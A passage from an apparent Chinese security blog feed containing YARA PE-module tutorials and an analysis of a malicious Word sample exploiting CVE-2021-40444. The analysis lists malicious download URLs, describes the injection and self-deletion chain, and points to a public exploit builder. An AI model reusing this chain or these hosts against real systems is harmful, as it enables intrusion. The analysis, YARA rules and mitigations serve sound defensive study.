运算符访问各个部分。具体的信息可以去官方文档进行查看。这里介绍部分。</p><p><code>name</code>，名称</p><p><code>virtual_address</code>，虚拟地址</p><p><code>virtual_size</code>，虚拟大小</p><p><code>raw_data_offset</code>，raw地址</p><p><code>raw_data_size</code>，raw大小</p><p>查看示例程序这几项的数据</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/9.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;.text&quot;</span> and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_address</span> == <span class="hljs-number">0</span>x1000 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_size</span> == <span class="hljs-number">0</span>xca1 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_offset</span> == <span class="hljs-number">0</span>x400 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_size</span> == <span class="hljs-number">0</span>xe00<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><p>一个从0开始的资源对象数组，PE拥有的每个资源对应一个。可以使用[]访问单个资源。每个资源对象具有以下属性：</p><p><code>rva</code> 资源数据的RVA</p><p><code>offset</code> 资源数据偏移量</p><p><code>length</code> 资源数据的长度</p><p><code>type</code> 资源类型（整数）</p><p><code>id</code> 资源的ID（整数）</p><p><code>language</code> 资源的语言（整数）</p><p><code>type_string</code> 资源类型为字符串</p><p><code>name_string</code> 字符串的资源名称</p><p><code>language_string</code> 字符串的资源语言</p><p>根据PE结构的资源部分可以知道，资源节是树状的结构，一层一层，而第一层就是资源类型，第二层是资源ID，第三层是资源语言，然后之后是具体的数据，具体这部分可以去学习一下PE结构。</p><p>看下示例文件的资源结构，如图可以看到这三项分别是24、1、1033。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/10.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type</span> == <span class="hljs-number">24</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">1</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">1033</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.length</span> == <span class="hljs-number">0</span>x17D<br>&#125;<br></code></pre></div></td></tr></table></figure><p>再拿一个别的文件来进行测试，可以看到其资源类型是字符串类型“MYRES”</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/11.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type_string</span> == <span class="hljs-string">&quot;M\x00Y\x00R\x00E\x00S\x00&quot;</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">102</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">2052</span><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>再测试一个文件，看到资源类型和资源ID都是字符串。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/12.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">import &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.resources[0].type_string == &quot;U<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00D<span class="hljs-symbol">\x</span>00E<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].name_string == &quot;L<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00L<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00T<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].language == 0<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><h3 id="pdb-path"><a href="#pdb-path" class="headerlink" title="pdb_path"></a>pdb_path</h3><p>pdb文件的路径</p><p>查看示例程序的PDB路径</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/13.png"></p><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.pdb_path <span class="hljs-operator">==</span> <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>programing<span class="hljs-subst">\\</span>something<span class="hljs-subst">\\</span>YaraRule_Test<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>YaraRule_Test.pdb&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><p>PE文件导出的函数名，可以使用函数名也可以使用序号。</p><p>测试一下user32.dll，我们知道这个DLL会导出函数<code>MessageBoxA</code></p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe.<span class="hljs-built_in">exports</span>(<span class="hljs-string">&quot;MessageBoxA&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/14.png"></p><h3 id="imports"><a href="#imports" class="headerlink" title="imports"></a>imports</h3><p>如果一个PE文件从某DLL中导入了某个函数，则函数会返回TRUE，否则返回FALSE。我们的测试程序调用了MessageBoxA，这个函数是从user32.dll中导入的。也可以使用序号，也可以只是dll名称，具体用法还有很多，请查看官方文档。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/15.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.imports(<span class="hljs-string">&quot;user32.dll&quot;</span>,<span class="hljs-string">&quot;MessageBoxA&quot;</span>) <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="is-pe"><a href="#is-pe" class="headerlink" title="is_pe"></a>is_pe</h3><p>如果文件是PE文件，返回true</p><h3 id="is-dll"><a href="#is-dll" class="headerlink" title="is_dll()"></a>is_dll()</h3><p>如果是DLL文件，返回true</p><h3 id="is-32bit"><a href="#is-32bit" class="headerlink" title="is_32bit()"></a>is_32bit()</h3><p>如果PE文件是32位的，返回true</p><h3 id="is-64bit"><a href="#is-64bit" class="headerlink" title="is_64bit()"></a>is_64bit()</h3><p>如果PE文件是64位，返回true</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">ispe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_pe<br>&#125;<br>rule <span class="hljs-class">isdll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_dll()<br>&#125;<br>rule <span class="hljs-class">is32</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_32bit()<br>&#125;<br>rule <span class="hljs-class">is64</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_64bit()<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详</summary>
      
    
    
    
    <category term="YARA" scheme="https://b1ackie.cn/categories/YARA/"/>
    
    
    <category term="YARA" scheme="https://b1ackie.cn/tags/YARA/"/>
    
    <category term="恶意代码检测" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-40444的样本分析</title>
    <link href="https://b1ackie.cn/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://b1ackie.cn/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-09-22T03:23:17.000Z</published>
    <updated>2021-09-22T03:26:51.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间微软披露了cve-2021-40444，紧随其后就有大量的样本利用了此漏洞，本篇来分析一下一个利用了此漏洞的样本。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><ul><li>样本名称：A Letter before court 4.docx</li><li>样本大小：24177字节</li><li>样本类型：TrojanDownloader、exploit、cve-2021-40444</li><li>MD5：1d2094ce85d66878ee079185e2761beb</li><li>SHA1：53b31e513d8e23e30b7f133d4504ca7429f0e1fe</li><li>SHA256：938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52</li></ul><h2 id="样本行为"><a href="#样本行为" class="headerlink" title="样本行为"></a>样本行为</h2><ol><li>打开文档尝试访问<a href="http://hidusi.com/e8c76295a5f9acb7">http://hidusi.com/e8c76295a5f9acb7</a> ，并下载side.html。</li><li>side.html内部包含混淆过的JS代码来利用 CVE-2021-40444漏洞来进行攻击。</li><li>side.html访问<a href="http://hidusi.com/e8c76295a5f9acb7/ministry.cab">http://hidusi.com/e8c76295a5f9acb7/ministry.cab</a> ，ministry.cab中包含着一个inf文件，实际上这是一个dll文件。</li><li>将cab中的Champion.inf文件保存在电脑上的若干路径。</li><li>执行Champion.inf，它会进行APC注入，注入进程为wabmig.exe，然后启动powershell进程实现自删除。</li></ol><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>打开文档会比较慢，可以看到提示正在从服务器下载side.html文件。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/1.png"></p><p>将DOCX格式改为压缩包格式进行解压缩，在文件内找到\word\_rels下的document.xml.rels文件，当存在需要下载的内容时，里面会存放地址。</p><p>可以看到请求下载的地址。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2.png"></p><p>打开side.html文件，里面是混淆过得JS代码，这部分JS代码利用了漏洞来进行攻击。本篇不讨论具体的漏洞攻击详情，只涉及到样本的分析。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/3.png"></p><p><a href="https://github.com/lockedbyte/CVE-2021-40444%EF%BC%8C%E5%9C%A8%E8%BF%99%E9%87%8C%E6%89%BE%E5%88%B0%E4%BA%86%E7%BD%91%E4%B8%8A%E7%9A%84%E4%BD%9C%E8%80%85%E8%A7%A3%E5%BC%80%E4%BA%86%E6%B7%B7%E6%B7%86%E5%90%8E%E7%9A%84JS%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%85%B6%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96cab%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BC%9A%E9%80%9A%E8%BF%87%E6%89%A7%E8%A1%8Ccpl%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AAinf%E6%96%87%E4%BB%B6%E3%80%82">https://github.com/lockedbyte/CVE-2021-40444，在这里找到了网上的作者解开了混淆后的JS代码，可以看到其访问获取cab的路径，然后会通过执行cpl命令去执行一个inf文件。</a></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/4.png"></p><p>因为域名已经挂了，所以尝试自己复现一下漏洞，还原整个攻击流程。<a href="https://github.com/lockedbyte/CVE-2021-40444%EF%BC%8C%E5%9C%A8%E8%BF%99%E9%87%8C%E6%9C%89%E5%B7%B2%E7%BB%8F%E7%BC%96%E5%86%99%E5%A5%BD%E7%9A%84EXP%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E3%80%82">https://github.com/lockedbyte/CVE-2021-40444，在这里有已经编写好的EXP，可以直接利用。</a></p><p>自己编写一个DLL，来弹出计算器。</p><figure class="highlight objectivec"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-built_in">BOOL</span> APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_SHOW);<span class="hljs-comment">//弹出计算器</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译，指定自己的DLL文件和服务器地址。然后会在out目录下生成一个DOC文档。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/16.png"></p><p>在测试机打开文档，弹出计算器，效果如下</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/test.gif"></p><p>通过火绒剑监控行为，可以看到样本通过rundll32执行了命令，msword.inf就是样本中的championship.inf只是名字不同。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/17.png"></p><p>在指定目录下生成的inf文件</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/19.png"></p><p>现在分析一下championship文件，前部分有大量的复杂代码，通过fakenet判断它会尝试访问macuwf.com/get_load，因为域名已经挂了，猜测里面可能是shellcode的资源。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/18.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/5.png"></p><p>然后会获取一些函数的地址</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/6.png"></p><p>通过WMI接口来创建进程</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/7.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/8.png"></p><p>遍历线程</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/9.png"></p><p>如果没有SeDebugPrivilege会尝试提权</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/10.png"></p><p>写内存</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png"></p><p>APC注入</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.png"></p><p>最后会启动powershell删除自身</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/13.png"></p><p>实际注入的shellcode，并没有任何意义且只有二十个字节左右，猜测是访问服务器进行下载的，因为服务器已经挂了，部分无法分析。</p><h2 id="防范建议"><a href="#防范建议" class="headerlink" title="防范建议"></a>防范建议</h2><ol><li><p>及时更新安全补丁</p></li><li><p>禁用ActiveX控件</p></li><li><p>将以下内容复制到文本文档中，保存为.reg文件并且执行</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">Windows Registry Editor Version 5.00<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\0</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\1</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\2</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\3</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br></code></pre></div></td></tr></table></figure></li><li><p>不要轻易打开未知来源的OFFICE文件。</p></li></ol><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="MD5："><a href="#MD5：" class="headerlink" title="MD5："></a>MD5：</h3><p>1d2094ce85d66878ee079185e2761beb</p><p>4c80dc9fb7483214b1613957aae57e2a</p><p>faf0a0b2e0d987fd487c63f6495a9fa4</p><p>e770385f9a743ad4098f510166699305</p><h3 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h3><p><a href="http://hidusi.com/e8c76295a5f9acb7/side.html">http://hidusi.com/e8c76295a5f9acb7/side.html</a></p><p><a href="http://hidusi.com/e8c76295a5f9acb7/ministry.cab">http://hidusi.com/e8c76295a5f9acb7/ministry.cab</a></p><p><a href="http://macuwf.com/">http://macuwf.com</a></p><p><a href="http://macuwf.com/get_load">http://macuwf.com/get_load</a></p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></p><p><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p><a href="https://www.trendmicro.com/en_no/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html">https://www.trendmicro.com/en_no/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间微软披露了cve-2021-40444，紧随其后就有大量的样本利用了此漏洞，本篇来分析一下一个利用了此漏洞的样本。&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="CVE-2021-40444" scheme="https://b1ackie.cn/tags/CVE-2021-40444/"/>
    
  </entry>
  
  <entry>
    <title>yara规则学习笔记（二）</title>
    <link href="https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-09-14T08:38:17.000Z</published>
    <updated>2021-09-22T08:18:54.826Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇地址 <a href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">yara规则学习笔记（一）</a></p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>可以使用<code>and</code>,<code>or</code>以及<code>not</code>等来进行布尔运算，关系运算符<code>&gt;=</code>,<code>&lt;=</code>,<code>&lt;</code>,<code>&gt;</code>,<code>==</code>和<code>!=</code>，算数运算符<code>+</code>,<code>-</code>,<code>*</code>,<code>\</code>,<code>%</code>，，按位运算符<code>&amp;</code>,<code>|</code>,<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>~</code>,<code>^</code>。</p><p>字符串标识符也可以在条件中使用，充当布尔变量，其值取决于文件中相关字符串的存在与否。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;asd&quot;</span> <br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;zxc&quot;</span><br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;987&quot;</span><br>condition:<br>(<span class="hljs-variable">$a</span> or <span class="hljs-variable">$b</span>) and (<span class="hljs-variable">$c</span> or <span class="hljs-variable">$d</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，$a或者$b的任何字符串命中以及同时$c或者$d命中就是满足条件。</p><p><img 